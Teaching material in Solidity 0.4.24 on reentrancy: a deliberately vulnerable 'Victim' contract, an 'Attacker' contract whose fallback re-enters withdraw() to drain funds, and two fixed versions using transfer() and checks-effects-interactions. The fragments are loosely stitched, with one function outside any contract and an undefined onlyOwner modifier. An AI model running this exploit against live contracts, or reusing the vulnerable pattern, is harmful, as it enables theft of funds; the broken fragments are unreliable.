pragma solidity^0.4.24;

contract Victim {

    // Mapping to keep tract of user deposits
    mapping (address => uint) private balances;

    // Function to withdraw the contract balance
    function withdraw() public {
        uint amount = balances[msg.sender];
        msg.sender.call.value(amount)();
        balances[msg.sender] = 0;
    }

    // Function to deposit ether
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

pragma solidity^0.4.24;

contract Attacker {

    // Victim contract instance
    Victim victim;

    constructor(address _victim) public {
        victim = Victim(_victim);
    }

    // Deposit an amount and withdraw it immediatly
    // Initiates the attack process
    function getJackpot() public payable {
        victim.deposit.value(msg.value)();
        victim.withdraw();
    }

    // Fallback function calls back into the contract again
    function () public payable {
        if (address(victim).balance >= msg.value) {
            victim.withdraw();
        }
    }

    // Function to withdraw the jackpot
    function withdrawJackpot() onlyOwner public {
        address(msg.sender).transfer(address(this).balance);
    }
}

// Function to withdraw the user balance
// Avoids using low-level call function
function withdraw() public {
    uint amount = balances[msg.sender];
    // Transfer function to transfer value
    // Gas limit of 2300
    msg.sender.transfer(amount);
    balances[msg.sender] = 0;
}


pragma solidity^0.4.24;

contract NotVictim {

    // Mapping to keep tract of user deposits
    mapping (address => uint) private balances;

    // Function to withdraw the user balance
    // Follows checks-effection-interaction pattern
    function withdraw() public {
        // Checks-effects
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;
        // Interaction
        msg.sender.call.value(amount)();
    }

    // Function to deposit ether
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}